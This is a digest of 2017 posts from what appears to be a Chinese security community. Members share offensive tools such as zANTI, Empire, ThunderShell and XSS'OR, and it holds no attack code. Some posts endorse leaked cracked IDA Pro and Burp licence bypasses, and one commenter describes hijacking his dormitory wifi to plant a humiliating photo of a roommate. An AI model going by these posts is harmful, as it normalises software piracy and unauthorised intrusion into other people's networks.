<img src="https://file.xiaomiquan.com/eb/ce/ebceabace3eaa00f4f49859462d3f03e8c12c7cbb15b2e53c8b2f751ad294dfc.jpg" width="25px"/> __su__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 感谢大大解答。找到原因了，是弄反了，另外比较了一下，linux版带-q，windows版的nc没-q，而且少好几个参数。

...

---

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ on 2017-07-03:


__#姿势#__

 
__#python#__

 

刚好之前ke分享了netcat的使用，这次为大家分享一下如何使用python编写一个简单的python版的netcat。


[python编写简单netcat | D_infinite的小站](http://dinfinite.cn/2017/07/03/python%E7%BC%96%E5%86%99%E7%AE%80%E5%8D%95netcat/)



还是一样，有任何问题和建议欢迎评论区留言，咱们共同分享，共同进步。



---


## Kali

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-18:


__#工具#__

推荐 katoolin 快速安装 Kali 任意工具


[GitHub - LionSec/katoolin: Automatically install a...](https://github.com/LionSec/katoolin)

 

Ubuntu 下体验还不错，看源码可以发现是添加了 Kali 的源，然后 apt-get install 安装。

有时候我们的 VPS 是 Ubuntu，想快速安装一些 Kali 里的好工具，就用 katoolin 即可。

BTW：很多开源工具都是 Python 写的，我们在用爽的同时不妨学习下其源码，如果发现 bug 还可以去对应的 GitHub 上提交修正。这种互动很值得鼓励。

<img src="https://images.xiaomiquan.com/FtLBOd503NNTsOrwDZWvfpyYT-Tf?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:7VBoWHu9g1ANgaguRGMOKa5Kyq4=" width="50%" height="50%" align="middle"/>

---

## Burp Suite


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-05:


__#工具#__

Burp Suite 1.7.26 发布，其中增加了个先进功能“文件上传漏洞发现”，支持这些格式的嵌入上传：
PDF, SVG, HTML, PHP, SSI.

并且支持外带回显。

Web 黑必备神器，有钱就买吧，没钱就等破解版。


[http://releases.portswigger.net/2017/08/1726.html](http://releases.portswigger.net/2017/08/1726.html)



<img src="https://images.xiaomiquan.com/Fp11Wh8SEBk47NN32yFfqOQCjiKZ?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:j0zRyAqkqR8_latcqru_yIR-0UA=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-12-04:


__#姿势#__

自己动手丰衣足食 ：一个bat解决burp过期问题

来自@h4ck0ne  的分享，很赞这种分享！


__分享文件:__

[解决全版本burp时间过期问题 -h4ck0ne.docx](https://github.com/ChrisLinn/greyhame-2017/blob/master/shared-files/解决全版本burp时间过期问题 -h4ck0ne.docx)


---

## nethunter


<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-06-28:

玩黑手的大伙儿估计都知道nethunter，很不错的黑手套装，只是有些机型比较难刷。今天推一个不一样的黑手玩法：How about a complete Linux on your phone?

Linuxdeploy(play商店有下)能够在root过的安卓手机上安装完整Linux系统，目前支持的发行版有Debian, Ubuntu, Kali Linux, Arch Linux, Fedora, CentOS, Gentoo, openSUSE, Slackware, RootFS 
功能非常之强大，还支持好几种GUI，更多功能有待大家慢慢把玩

Play商店下载地址
[https://play.google.com/store/apps/details?id=ru.m...](https://play.google.com/store/apps/details?id=ru.meefik.linuxdeploy)



另外，linuxdeploy还是开源的！

[GitHub - meefik/linuxdeploy: Install and run GNU/L...](https://github.com/meefik/linuxdeploy)



有的同学可能会觉得手机上键盘是个痛点，没关系我们有hacker keyboard

[https://play.google.com/store/apps/details?id=org....](https://play.google.com/store/apps/details?id=org.pocketworkstation.pckeyboard)




What you can do on Linux, you can do the same on your PHONE

<img src="https://images.xiaomiquan.com/FmquZZWgZvzfY2fLJ_thKf6q6ViE?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:ef1vBeGiGMuP6yZL7GL_xOsWYK4=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/FiIojwNo0_ehijjifjOMjddpRrLi?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:gFWPK2hQHtn_DnSZemaTZ6_hvtM=" width="50%" height="50%" align="middle"/>


---


## OSINT


<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__ on 2017-05-31:

> 匿名用户 提问：
看到小密圈安全平台，毫不犹豫的订了，想问一下，一直困扰我的问题，在国外有专门有基于互联网信息收集的工具，有基于twitter，或facebook的信息收集工具如meltago，有google hacking,在国内有类似基于QQ号码或微搏帐号收集工具吗，如果有，有哪些，非常感谢。有类似baidu hacking的东西吗


暂时没看到这样全面的，国内这种环境，限制了这类工具的发展与分享。

不过前几天我们看到这个：

[GitHub - jm33-m0/massExpConsole: adding more exploits and tools](https://github.com/jm33-m0/massExpConsole)



里面有集成国内的 Baidu、ZoomEye，可以看看。

顺便补充，这类工具我们称为 OSINT，在之前发布的“渗透技能树之利器”里有专门归类。

如果谁写了个这样的好工具，可以分享一下。



...

<img src="https://file.xiaomiquan.com/bd/52/bd5240ef725ab07f77d1a8c67cdaa7f3ceac055d5eba1b2af0362c3e7fbc2a2f.jpg" width="25px"/> __Z.__: OSINT的目的是什么？

<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__ replies to <img src="https://file.xiaomiquan.com/bd/52/bd5240ef725ab07f77d1a8c67cdaa7f3ceac055d5eba1b2af0362c3e7fbc2a2f.jpg" width="25px"/> __Z.__: 各种情报集合汇总

<img src="https://file.xiaomiquan.com/bd/52/bd5240ef725ab07f77d1a8c67cdaa7f3ceac055d5eba1b2af0362c3e7fbc2a2f.jpg" width="25px"/> __Z.__ replies to <img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__: 新词get√


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-24:


__#HITB#__

早上最期待的议题来了，红队！

刚刚看到公布的一个调研工具：

LinkedInt

[GitHub - mdsecactivebreach/LinkedInt: LinkedInt: A...](https://github.com/mdsecactivebreach/LinkedInt)


A LinkedIn scraper for reconnaissance during adversary simulation.

专门针对 LinkedIn 做调研的小工具。

<img src="https://images.xiaomiquan.com/Fmn1t20J7ksEIixJrByTU-Z3ghS2?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:3TQMyMsGsS_2OUTMigAi6nD7kHQ=" width="50%" height="50%" align="middle"/>


---

## Secure Headers



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-02:


__#工具#__

  HTTP 响应头安全审计工具


[GitHub - m3liot/shcheck: Just a small tool to chec...](https://github.com/m3liot/shcheck)



Python 写的，代码很短很简单，审计原理也特别简单，审计如下响应安全头是否存在：

```
sec_headers = {
    'X-XSS-Protection': 'warning',
    'X-Frame-Options': 'warning',
    'X-Content-Type-Options': 'warning',
    'Strict-Transport-Security': 'alert',
    'Public-Key-Pins': 'none',
    'Content-Security-Policy': 'warning',
    'X-Permitted-Cross-Domain-Policies': 'warning',
    'Referrer-Policy': 'warning'

}
```

如果对 Python 及 HTTP 协议感兴趣的，可以读一遍这段代码。遇到不懂的百度/Google 就好，比如上面那些安全头分别是用来干什么的。

然后可以思考，这个工具还应该完善些什么？

欢迎交流。

<img src="https://images.xiaomiquan.com/FplPjJkSHarVCGj6gNrbtY5s0TmT?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:_-1-Kcu2jTj3xUOglzJTP5m6-GA=" width="50%" height="50%" align="middle"/>


...


<img src="https://file.xiaomiquan.com/ec/58/ec584bd5317eed5d600661946b7f03d6a8fc84aed419388421653fff51502f50.jpg" width="25px"/> __张大嫂__: 我的理解是这个程序只检测了header是否存在，根本没管具体的值是什么。所以可以改进的点是根据具体header，再监测内容是否合法。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/ec/58/ec584bd5317eed5d600661946b7f03d6a8fc84aed419388421653fff51502f50.jpg" width="25px"/> __张大嫂__: 有一些判断的

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 根据响应头的值，来做更多的分析？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 这些安全头部应用好的话可以防御不少前端安全问题

<img src="https://file.xiaomiquan.com/b6/4a/b64a313d21a50c71fa67bee596a343fd60aa66d5437d5ee537f28bcb3849b8ca.jpg" width="25px"/> __北风飘然__: 弦大，刚把代码读了一遍大概是判断返回的headers里面是否有安全头  调试的时候尝试了下某宝和度娘 某宝只有一个https的 度娘一个也没有  不止这些头意义是否很大  因为在例子里面看了Facebook拥有4个~~

<img src="https://file.xiaomiquan.com/c0/c0/c0c08efbac9f7841a0b0e34210cb18f0b6f5e0edcf5dcf3b5e00492c95406fd6.jpg" width="25px"/> __八分熟__: 我认为如果没有缺少某个安全头后可以对其进一步得分析与攻击。

<img src="https://file.xiaomiquan.com/7c/6a/7c6aab8c36f994d131ccd6b8365a3be2917ab22cf639a3e0ac140729b1cba2dd.jpg" width="25px"/> __M1k3__: HTTP头介绍较全 
[List of HTTP header fields - Wikipedia](https://en.wikipedia.org/wiki/List_of_HTTP_header_fields)

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/7c/6a/7c6aab8c36f994d131ccd6b8365a3be2917ab22cf639a3e0ac140729b1cba2dd.jpg" width="25px"/> __M1k3__: 不错

<img src="https://file.xiaomiquan.com/7c/6a/7c6aab8c36f994d131ccd6b8365a3be2917ab22cf639a3e0ac140729b1cba2dd.jpg" width="25px"/> __M1k3__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 有些http头是跟浏览器相关的，工具可以添加模拟不同浏览器功能，去请求分析，httpt头是否有相应的安全设置；

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 关于这些响应安全头的介绍，大家可以看 OWASP 这个链接：
[OWASP Secure Headers Project - OWASP](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#tab=Headers)


...

---


## Cracking



<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__ on 2017-06-09:

> 匿名用户 提问：
在有一定硬件支持下，想自己用服务器塔成专门跑密码的，目前只是下载了彩虹表 和其它之类跑简单密码大概1.5T，  请问一下你们在公司肯定也有专门跑密码的方案吧？  比如像 WordPress之类的密码和系统以及无线的密码？ 用什么工具以等。  能参考下或者提下意见么？


没，不过你可以试试 hashcat



...

<img src="https://file.xiaomiquan.com/fd/52/fd52795f8c90530dd8d49e20cb3ddbccc3ce8bae8e54e99b936597ba4f6c3026.jpg" width="25px"/> __hi404__: hashcat很牛逼的


...

---

## zANTI

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-18:


__#工具#__

内网渗透神器 App：zANTI 2.5.0 下载

刚刚看到 zANTI 的这篇文章：


[zANTI APK 2.5.0 Download For Android 2017 - Zanti ...](http://zantiapk.com/zanti-apk/)

 

介绍了 2.5.0 的下载，特性如下：

+ Hijack HTTP session.
+ Audit passwords.
+ MIMT(Man in the middle attack)
+ Network scanning.
+ Capture downloads.
+ Exploit routers.
+ MAC address spoofing.
+ Create a fake wifi hotspot.
+ Modify HTTP request.

我玩黑手（黑客手机）必定会安装 zANTI，这在做内网的渗透，尤其是自动主机及端口扫描，爆破，一些漏洞利用，路由器攻击，中间人劫持，Wi-Fi 伪造等方面，非常方便。

如果你有安卓手机，可以安装一个体验体验，需要 root。

<img src="https://images.xiaomiquan.com/Fi34-cbHoXhVOAxFlCxN--CjE5NN?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:OLaYLTc5o1l4q1AHyuJwhYB235c=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/17/1c/171c87fc22c8962abf10593ecbffe676b24ca95af8a9073951adb2fb18e4db9c.jpg" width="25px"/> __NashLing__: Fing也不错

<img src="https://file.xiaomiquan.com/43/75/43758f94b2117e0c90d9296c788197e13dfbdc4697b0e9bf77554487bec2b3e7.jpg" width="25px"/> __。东__: 最近新换了一个手机，一加3t，之前听说这个可以刷kali官方推送的nethunter的rom包，然后就自己折腾了一下把它刷到手机上，这个app让我联想到了kali的这款rom，具体参考freebuf:

[移动渗透测试平台搭建 – NetHunter 3.0 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/sectool/124074.html)



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/75/43758f94b2117e0c90d9296c788197e13dfbdc4697b0e9bf77554487bec2b3e7.jpg" width="25px"/> __。东__: Nethunter强大多了

<img src="https://file.xiaomiquan.com/f4/8a/f48a9a75747df8c1d7007d92d14ce161cfb6c950627b0478a854a96b9ee104ff.jpg" width="25px"/> __PattyBug™__: 回去买一加3T😉

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__: 昨天稍微玩了一下，把我们宿舍的wifi给黑了，把图片替换为我们宿舍一哥们只穿内裤时的图片。。只是一不小心把自己的手机给攻击了，某些应用连不上网，只能重新刷了一遍系统，真是折腾

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__: 怎么会需要重装？

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 试过重启路由器没用，用4g网也没用，重启手机也没用，只能重新刷一下系统了哎~不过还好之前刷过机，一会儿就搞定了

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__: ...缓存估计

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 嗯，这个我也想到了，只是手机没有清理缓存的软件，应用也装不了(T＿T)，就重刷了

<img src="https://file.xiaomiquan.com/09/17/09173a8ddd903516f16515893f44703fd4de9ec901a54ac5deeccfe9db189fdd.jpg" width="25px"/> __BigBoy__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 去年想研究NetHunter，当时一加只出到2,买回来是刷上了，不过Type-C连接外置网卡研究了很久都没成功过，有倒过此坑的同学吱个声哈

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/09/17/09173a8ddd903516f16515893f44703fd4de9ec901a54ac5deeccfe9db189fdd.jpg" width="25px"/> __BigBoy__: 刷成功了，只是某些东西还不太会配置。。


...

---


## XSSOR


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-25:

XSS'OR - Hack with JavaScript 开源！

采用 BSD 开源协议，很宽松，不限制传播与商业化，留下作者版权就好。


[GitHub - evilcos/xssor2: XSS'OR - Hack with JavaSc...](https://github.com/evilcos/xssor2)



简单说明下：

上线之后（xssor.io），使用频率还不错。源码是 Python 及 JavaScript，采用了 Django、Bootstrap、jQuery 三个优秀框架，可以完整覆盖前后端，基于这三个框架，开发速度非常的快，整个过程消耗我不到一周时间，其中一半耗时在软件设计上。感兴趣这个过程的，可以读这套源码，很简洁，在开发过程中我特意去掉数据库（因为我觉得我这个应用场景其实不需要数据库）。

既然开源了，后续应该会和新组建的 ATToT 安全团队一起去完善它。

有任何问题，欢迎联系我。



...

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 这个是攻击平台吗

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: xssor.io 玩玩就知道

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-13:


__#工具#__

  XSS'OR 今天更新了，很强大，如果会玩的话。

更新了两个小地方：

Probe 探针支持 file:// 协议了；
Probe 探针的状态做了优化；

在线体验：xssor.io
开源地址：

[GitHub - evilcos/xssor2: XSS'OR - Hack with JavaScript.](https://github.com/evilcos/xssor2)



<img src="https://images.xiaomiquan.com/FjFXjgxTAku6ZUw885v0lOQmQY3P?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:mBhlxLgPMFq6twDtZX0TKjEawEY=" width="50%" height="50%" align="middle"/>


---

## Proxy

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-07-20:

for some reason，少年，抽个SSR吧

[shadowsocks-rss/readme.md at master · breakwa11/sh...](https://github.com/breakwa11/shadowsocks-rss/blob/master/readme.md)



...

<img src="https://file.xiaomiquan.com/c7/0e/c70e5f97b5bc36fffa24c5b1d92138c1db4dd711c3802fcc6e6eb0aeaac50b03.jpg" width="25px"/> __Ctf__: 与NG版本的有什么区别吗

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/c7/0e/c70e5f97b5bc36fffa24c5b1d92138c1db4dd711c3802fcc6e6eb0aeaac50b03.jpg" width="25px"/> __Ctf__: 带混淆模块

...

---


## cSploit



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-11:

> 匿名用户 提问：
cos大大新手求指导cSploit的大部分功能能够用kali自带的工具复现不？能不能举个栗子，实在不熟kali的工具哇


可以，了解好 ethercap、arpspoof 等命令，你读读 cSploit 源码，就会发现它底层也是基于这些命令。还可以进一步了解 bettercap、responder 这些。

至于每个命令工具怎么用，网上教程多，自己摸索也行。


---


## RAT

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-09-17:


__#tools#__

ThunderShell基于PowerShell的RAT,使用HTTP进行通信。网络流量使用RC4进行加密

[https://github.com/Mr-Un1k0d3r/ThunderShell](https://github.com/Mr-Un1k0d3r/ThunderShell)


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: RingZer0 Team 最近真活跃，已经开源了好几个项目了

...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-31:


__#工具#__

Empire 更新了 v2.1

Empire is a PowerShell and Python post-exploitation agent.

这款 PowerShell 与 Python 攻击利用神器，想必越来越多渗透师在用。时隔3个多月，更新了不少内容。具体的可以看这：


[Empire/changelog at master · EmpireProject/Empire ...](https://github.com/EmpireProject/Empire/blob/master/changelog)



我最感兴趣的更新内容是下面这条：

-Add Obfuscated Empire #597 @cobbr

增加了混淆 Empire，这个我们第一时间就跟进研究并运用了，Empire 也真的整合了，不过我还没测试整合得如何。

基于 Python 构建的 Empire 开源生态非常有前途（远不仅是 Empire 本身），由于这种生态在 GitHub 这种高浓度黑客氛围下发展着，渗透师的距离也越来越小了。和我交流过的人会明白此时的竞争壁垒在哪，加油吧。

如果你听都没听说过这个，或没实战运用过，自己查资料吧。



...

<img src="https://file.xiaomiquan.com/e4/ca/e4ca0340ac566f302dcda0afe835affed902e62dda2344fce0b7f9ac7cde2f21.jpg" width="25px"/> __safecat__: 第一次生成加密脚本的时候非常吃cpu。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-13:


__#工具#__

  渗透利用神器 Empire 2.2 发布及一点看法


[Empire 2.2 – Maintaining an Empire – rvrsh3ll’s Bl...](http://www.rvrsh3ll.net/blog/empire/empire-2-2-maintaining-an-empire/)

 

优化了一些问题及增加了一些特性，英文很简单自己看吧。还可以搜搜本圈，之前也发过历史相关。这些 Red Team 牛人在加速 Empire 发展，下一版本说是直接跳到 3.0。

特别说下，Empire 估计不会特别去发展混淆 Empire 技术，他们觉得和杀软们玩打地鼠游戏没意思。其实这个我赞同，文件静态免杀应该自己来，脚本混淆多简单的事。Empire 在渗透其他方面如绕过、伪装、隐藏一直在提升，不过对抗是动态的，不断进化是必然的。

Empire 确实是很优秀的渗透利用框架（其实就是个远控）。Empire 生态能发展还有个重要特性：

REST API。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-31:


__#工具#__

  Empire 2.3 发布


[Empire/changelog at master · EmpireProject/Empire ...](https://github.com/EmpireProject/Empire/blob/master/changelog)

 

就是做了不少 fix，主要功能变化还是要等 3.0 这个大版本。嗯，之前说过。



---

## Scanner



<img src="https://file.xiaomiquan.com/53/93/5393f85d981fdca80d89f411c1db56b464ad0512f3e49b0e88bfc2ce40916a62.jpg" width="25px"/> __RAY__ on 2017-09-21:


[CptJesus | SharpHound: Evolution of the BloodHound...](https://blog.cptjesus.com/posts/newbloodhoundingestor)



[GitHub - BloodHoundAD/SharpHound: The BloodHound C...](https://github.com/BloodHoundAD/SharpHound)



BloodHound团队这两天用c#重写了BloodHound的扫描端，解决不少线程性能问题，还加入了缓存机制，对大型域网络更容易进行扫描了。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 佩服，居然C#重写，而且还继续开源

<img src="https://file.xiaomiquan.com/53/93/5393f85d981fdca80d89f411c1db56b464ad0512f3e49b0e88bfc2ce40916a62.jpg" width="25px"/> __RAY__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这个团队正好是specterops公司的，一个大牛云集的红队公司。

<img src="https://file.xiaomiquan.com/14/0f/140fb95e9c03f1ea592d0b97e3860eebaa2d094c683a2412a5db396e7211c8be.jpg" width="25px"/> __cx__ replies to <img src="https://file.xiaomiquan.com/53/93/5393f85d981fdca80d89f411c1db56b464ad0512f3e49b0e88bfc2ce40916a62.jpg" width="25px"/> __RAY__: 简称红牛


...

---


## IDA

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-30:


__#资源#__

 Ida Pro 7.0 + All Decompilers Full Leak-Pass


[Ida Pro 7.0   All Decompilers Full Leak-Pass - 『逆向...](https://www.52pojie.cn/thread-648089-1-1.html)



[[Из привата] [LEAKED] IDA Pro 7.0   HexRays 2 (ARM...](https://forum.reverse4you.org/showthread.php?t=2627)



应该都有了吧？应该不会在私人电脑里直接用吧？

6.8 已经是逆向常用神器，7.0 继续。



...

<img src="https://file.xiaomiquan.com/51/d2/51d2c4ce46028b8a20e73e80c24617572fdb4cdf8ee23494fd90f88dbedd9173.jpg" width="25px"/> __Time2AM__: 私人电脑用会怎样。😂

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/51/d2/51d2c4ce46028b8a20e73e80c24617572fdb4cdf8ee23494fd90f88dbedd9173.jpg" width="25px"/> __Time2AM__: 不保证没猫腻

...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-11-13:


__#姿势#__

Ubuntu 上安装 IDA Pro 7.0

注：破解版可以搜本圈关键词：IDA，先下载好。

最近更新了常用 Ubuntu 到 16.04 64 位，桌面版的，之前的逆向环境也顺便做了个升级，这里把安装 IDA Pro 7.0 的经验给大家简单分享下。

Ubuntu 初始化的源可以使用 aliyun 的，国内更新快。

第一个坑是 Wine 的版本问题。

默认情况下，apt-get 里安装的是 1.6 系列的，这个系列实测对 IDA Pro 7.0 兼容性不行，那么只能乖乖按照官方指南走：


[Ubuntu - WineHQ Wiki](https://wiki.winehq.org/Ubuntu)



安装后，右键 IDA Pro 的 exe 文件，选择 Wine 打开安装。

第二个坑是 Python 2.7 64 位安装不上。

可以先忽略完成 IDA Pro 的安装后，再单独安装：

下载 Python 2.7 的 MSI 文件，命令行下执行：

`wine64 msiexec /i python-2.7.14.amd64.msi`

即可顺利完成安装，注意这里执行的是 wine64 命令，就这点小差异:)

